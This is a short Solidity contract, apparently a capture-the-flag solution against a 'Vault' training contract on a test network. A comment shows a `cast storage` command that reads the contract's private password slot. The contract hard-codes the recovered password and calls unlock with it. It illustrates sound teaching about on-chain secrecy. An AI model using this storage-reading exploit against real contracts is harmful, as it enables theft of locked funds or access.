// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Vault {
    function unlock(bytes32 _password) external;
}

contract Exploit {
    // cast storage 0x8505046751cE4011eC25bbF0D328D4136B596a81 1 --rpc-url https://rpc.sepolia.org
    bytes32 private password = 0x412076657279207374726f6e67207365637265742070617373776f7264203a29;
    address VaultAddress = 0x8505046751cE4011eC25bbF0D328D4136B596a81;
    Vault vault = Vault(VaultAddress);

    function unlock() public {
        vault.unlock(password);
    }
}
